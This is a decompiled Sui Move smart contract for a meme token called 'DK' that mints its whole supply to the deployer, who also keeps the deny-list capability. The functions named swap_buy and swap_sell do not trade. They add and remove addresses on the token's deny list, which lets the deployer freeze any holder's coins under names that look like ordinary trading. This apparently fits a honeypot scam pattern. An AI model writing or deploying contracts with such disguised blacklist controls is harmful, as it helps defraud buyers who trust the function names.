module 0x572e90329476c1219d4ee4c69e49d8ba8536e4adb444a925b4b79bbde6cfa6bb::dk {
    struct DK has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: DK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DK>(arg0, 9, b"DK", b"Just A Chill Donkey Fr", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmRwCQiZLDXLPjU3dAeCeQryfT8wNa4swqoMKkNaM7XCn9"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DK>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DK>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DK>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DK>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DK>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<DK>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

